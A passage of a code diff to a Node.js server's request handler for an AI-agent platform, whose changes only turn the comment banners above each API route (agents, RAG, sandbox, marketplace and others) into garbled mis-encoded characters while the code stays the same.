     if (method === 'POST' && reqPath.startsWith('/api/autonomous/resume/')) {
       const id = reqPath.split('/').pop();
       const runner = refs.autonomousRunner;
@@ -1110,7 +1170,7 @@ async function handleRequest(req, res) {
       try { return json(res, 200, runner.resume(id)); } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/autonomous/abort/:id â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/autonomous/abort/:id Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath.startsWith('/api/autonomous/abort/')) {
       const id = reqPath.split('/').pop();
       const runner = refs.autonomousRunner;
@@ -1118,13 +1178,13 @@ async function handleRequest(req, res) {
       try { return json(res, 200, runner.abort(id)); } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/autonomous/runs â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/autonomous/runs Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/autonomous/runs') {
       const runner = refs.autonomousRunner;
       return json(res, 200, { runs: runner ? runner.listRuns() : [] });
     }
 
-    // â•â•â• POST /api/debate â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/debate Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/debate') {
       const body = JSON.parse(await readBody(req));
       const debate = refs.agentDebate;
@@ -1135,7 +1195,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/debate/:id â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/debate/:id Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath.startsWith('/api/debate/') && reqPath !== '/api/debates') {
       const id = reqPath.split('/').pop();
       const debate = refs.agentDebate;
@@ -1145,13 +1205,13 @@ async function handleRequest(req, res) {
       return json(res, 200, transcript);
     }
 
-    // â•â•â• GET /api/debates â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/debates Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/debates') {
       const debate = refs.agentDebate;
       return json(res, 200, { debates: debate ? debate.listDebates() : [] });
     }
 
-    // â•â•â• GET /api/knowledge â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/knowledge Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/knowledge') {
       const kg = refs.knowledgeGraph;
       if (!kg) return json(res, 500, { error: 'Knowledge graph not available' });
@@ -1159,7 +1219,7 @@ async function handleRequest(req, res) {
       return json(res, 200, kg.query({ type: q.type, label: q.label, nodeId: q.nodeId }));
     }
 
-    // â•â•â• POST /api/knowledge â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/knowledge Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/knowledge') {
       const body = JSON.parse(await readBody(req));
       const kg = refs.knowledgeGraph;
@@ -1176,14 +1236,14 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/knowledge/visualize â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/knowledge/visualize Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/knowledge/visualize') {
       const kg = refs.knowledgeGraph;
       if (!kg) return json(res, 500, { error: 'Knowledge graph not available' });
       return json(res, 200, kg.getVisualizationData());
     }
 
-    // â•â•â• POST /api/agents/create â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/agents/create Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/agents/create') {
       const body = JSON.parse(await readBody(req));
       const factory = refs.agentFactory;
@@ -1198,13 +1258,13 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/agents/custom â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/agents/custom Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/agents/custom') {
       const factory = refs.agentFactory;
       return json(res, 200, { agents: factory ? factory.listCustomAgents() : [] });
     }
 
-    // â•â•â• DELETE /api/agents/custom/:id â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â DELETE /api/agents/custom/:id Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'DELETE' && reqPath.startsWith('/api/agents/custom/')) {
       const id = reqPath.split('/').pop();
       const factory = refs.agentFactory;
@@ -1212,26 +1272,26 @@ async function handleRequest(req, res) {
       try { return json(res, 200, factory.deleteAgent(id)); } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/warroom/feed â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/warroom/feed Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/warroom/feed') {
       const wr = refs.warRoom;
       const limit = parseInt(parsed.query.limit) || 50;
       return json(res, 200, { feed: wr ? wr.getActivityFeed(limit) : [] });
     }
 
-    // â•â•â• GET /api/warroom/metrics â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/warroom/metrics Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/warroom/metrics') {
       const wr = refs.warRoom;
       return json(res, 200, wr ? wr.getMetrics() : {});
     }
 
-    // â•â•â• GET /api/sentinel/watches â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/sentinel/watches Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/sentinel/watches') {
       const sentinel = refs.webSentinel;
       return json(res, 200, { watches: sentinel ? sentinel.listWatches() : [] });
     }
 
-    // â•â•â• POST /api/sentinel/watches â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/sentinel/watches Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/sentinel/watches') {
       const body = JSON.parse(await readBody(req));
       const sentinel = refs.webSentinel;
@@ -1242,7 +1302,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/sentinel/check/:id â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/sentinel/check/:id Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath.startsWith('/api/sentinel/check/')) {
       const id = reqPath.split('/').pop();
       const sentinel = refs.webSentinel;
@@ -1250,11 +1310,11 @@ async function handleRequest(req, res) {
       try { return json(res, 200, await sentinel.checkNow(id)); } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-    // v4.2 MODULES â€" Self-Evolve, Sandbox, Handoffs, Multi-User
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+    // v4.2 MODULES Ã¢â‚¬" Self-Evolve, Sandbox, Handoffs, Multi-User
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• POST /api/evolve/run â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/evolve/run Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/evolve/run') {
       var evolve = refs.selfEvolve;
       if (!evolve) return json(res, 500, { error: 'Self-evolve not available' });
@@ -1273,21 +1333,21 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/evolve/analyze â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/evolve/analyze Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/evolve/analyze') {
       const evolve = refs.selfEvolve;
       if (!evolve) return json(res, 500, { error: 'Self-evolve not available' });
       try { return json(res, 200, await evolve.analyze()); } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/evolve/suggestions â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/evolve/suggestions Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/evolve/suggestions') {
       const evolve = refs.selfEvolve;
       if (!evolve) return json(res, 500, { error: 'Self-evolve not available' });
       return json(res, 200, evolve.suggest());
     }
 
-    // â•â•â• POST /api/evolve/apply â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/evolve/apply Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/evolve/apply') {
       const body = JSON.parse(await readBody(req));
       const evolve = refs.selfEvolve;
@@ -1295,21 +1355,21 @@ async function handleRequest(req, res) {
       try { return json(res, 200, await evolve.apply(body.suggestionId || body.id)); } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/evolve/history â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/evolve/history Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/evolve/history') {
       const evolve = refs.selfEvolve;
       if (!evolve) return json(res, 500, { error: 'Self-evolve not available' });
       return json(res, 200, evolve.getHistory());
     }
 
-    // â•â•â• GET /api/evolve/report â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/evolve/report Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/evolve/report') {
       const evolve = refs.selfEvolve;
       if (!evolve) return json(res, 500, { error: 'Self-evolve not available' });
       try { return json(res, 200, await evolve.getReport()); } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/sandbox/run â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/sandbox/run Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/sandbox/run') {
       const body = JSON.parse(await readBody(req));
       const sandbox = refs.codeSandbox;
@@ -1318,7 +1378,7 @@ async function handleRequest(req, res) {
       try { return json(res, 200, await sandbox.execute(body.code, body.language || 'javascript', body.options || {})); } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/sandbox/history â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/sandbox/history Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/sandbox/history') {
       const sandbox = refs.codeSandbox;
       if (!sandbox) return json(res, 500, { error: 'Sandbox not available' });
@@ -1326,7 +1386,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { history: sandbox.getHistory(limit) });
     }
 
-    // â•â•â• POST /api/handoffs â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/handoffs Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/handoffs') {
       const body = JSON.parse(await readBody(req));
       const handoffs = refs.agentHandoffs;
@@ -1335,7 +1395,7 @@ async function handleRequest(req, res) {
       return json(res, 200, handoffs.handoff(body.fromAgent, body.toAgent, body.context || {}, body.reason || ''));
     }
 
-    // â•â•â• GET /api/handoffs/chain/:taskId â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/handoffs/chain/:taskId Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath.startsWith('/api/handoffs/chain/')) {
       const taskId = reqPath.split('/').pop();
       const handoffs = refs.agentHandoffs;
@@ -1343,14 +1403,14 @@ async function handleRequest(req, res) {
       return json(res, 200, handoffs.getChain(taskId));
     }
 
-    // â•â•â• GET /api/handoffs/stats â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/handoffs/stats Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/handoffs/stats') {
       const handoffs = refs.agentHandoffs;
       if (!handoffs) return json(res, 500, { error: 'Handoffs not available' });
       return json(res, 200, handoffs.getStats());
     }
 
-    // â•â•â• POST /api/users/session â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/users/session Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/users/session') {
       const body = JSON.parse(await readBody(req));
       const mu = refs.multiUser;
@@ -1359,7 +1419,7 @@ async function handleRequest(req, res) {
       return json(res, 200, mu.createSession(body.userId, body.name || body.userId));
     }
 
-    // â•â•â• GET /api/users/sessions â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/users/sessions Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/users/sessions') {
       const mu = refs.multiUser;
       if (!mu) return json(res, 500, { error: 'Multi-user not available' });
@@ -1369,7 +1429,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { sessions: mu.listSessions(isOperator) });
     }
 
-    // â•â•â• GET /api/users/me â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/users/me Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/users/me') {
       const mu = refs.multiUser;
       if (!mu) return json(res, 500, { error: 'Multi-user not available' });
@@ -1379,11 +1439,11 @@ async function handleRequest(req, res) {
       return json(res, 200, info);
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // v4.2+ MODULES: RAG, Scraper, Sandbox, Updates, Voice, Marketplace
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/rag â€" Query RAG â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/rag Ã¢â‚¬" Query RAG Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/rag') {
       const rag = refs.ragEngine;
       if (!rag) return json(res, 500, { error: 'RAG engine not available' });
@@ -1393,7 +1453,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { query: q, results });
     }
 
-    // â•â•â• POST /api/rag â€" Ingest into RAG â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/rag Ã¢â‚¬" Ingest into RAG Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/rag') {
       const body = JSON.parse(await readBody(req));
       const rag = refs.ragEngine;
@@ -1416,14 +1476,14 @@ async function handleRequest(req, res) {
       return json(res, 400, { error: 'Provide text, url, or query' });
     }
 
-    // â•â•â• GET /api/rag/documents â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/rag/documents Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/rag/documents') {
       const rag = refs.ragEngine;
       if (!rag) return json(res, 500, { error: 'RAG engine not available' });
       return json(res, 200, { documents: rag.listDocuments() });
     }
 
-    // â•â•â• DELETE /api/rag/documents â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â DELETE /api/rag/documents Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'DELETE' && reqPath.startsWith('/api/rag/documents')) {
       const rag = refs.ragEngine;
       if (!rag) return json(res, 500, { error: 'RAG engine not available' });
@@ -1518,7 +1578,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { status: 'ingested', filename: filename, document: { id: doc.id, chunkCount: doc.chunks.length } });
     }
 
-    // â•â•â• POST /api/scrape â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/scrape Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/scrape') {
       const body = JSON.parse(await readBody(req));
       const scraper = refs.webScraper;
@@ -1536,7 +1596,7 @@ async function handleRequest(req, res) {
       return json(res, 200, result);
     }
 
-    // â•â•â• POST /api/sandbox/execute â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/sandbox/execute Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/sandbox/execute') {
       const body = JSON.parse(await readBody(req));
       const sandbox = refs.codeSandbox;
@@ -1548,7 +1608,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/sandbox/languages â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/sandbox/languages Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/sandbox/languages') {
       const sandbox = refs.codeSandbox;
       if (!sandbox) return json(res, 500, { error: 'Sandbox not available' });
@@ -1556,7 +1616,7 @@ async function handleRequest(req, res) {
     }
 
 
-    // â•â•â• GET /api/updates â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/updates Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/updates') {
       const updater = refs.autoUpdater;
       if (!updater) return json(res, 500, { error: 'Auto-updater not available' });
@@ -1564,7 +1624,7 @@ async function handleRequest(req, res) {
       return json(res, 200, result);
     }
 
-    // â•â•â• POST /api/updates/apply â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/updates/apply Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/updates/apply') {
       const body = JSON.parse(await readBody(req));
       const updater = refs.autoUpdater;
@@ -1575,20 +1635,20 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/updates/suggestions â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/updates/suggestions Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/updates/suggestions') {
       const updater = refs.autoUpdater;
       if (!updater) return json(res, 500, { error: 'Auto-updater not available' });
       return json(res, 200, { suggestions: updater.getOptimizationSuggestions() });
     }
 
-    // â•â•â• GET /api/updates/history â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/updates/history Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/updates/history') {
       const updater = refs.autoUpdater;
       return json(res, 200, { history: updater ? updater.getUpdateHistory() : [] });
     }
 
-    // â•â•â• POST /api/voice/speak â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/voice/speak Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/voice/speak') {
       const body = JSON.parse(await readBody(req));
       const voice = refs.voiceEngine;
@@ -1600,7 +1660,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/voice/voices â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/voice/voices Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/voice/voices') {
       const voice = refs.voiceEngine;
       if (!voice) return json(res, 500, { error: 'Voice engine not available' });
@@ -1608,13 +1668,13 @@ async function handleRequest(req, res) {
       return json(res, 200, { voices });
     }
 
-    // â•â•â• GET /api/marketplace â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/marketplace Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/marketplace') {
       const mp = refs.agentMarketplace;
       return json(res, 200, { agents: mp ? mp.listImported() : [] });
     }
 
-    // â•â•â• POST /api/marketplace â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/marketplace Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/marketplace') {
       const body = JSON.parse(await readBody(req));
       const mp = refs.agentMarketplace;
@@ -1625,7 +1685,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/marketplace/export â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/marketplace/export Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/marketplace/export') {
       const body = JSON.parse(await readBody(req));
       const mp = refs.agentMarketplace;
@@ -1636,11 +1696,11 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
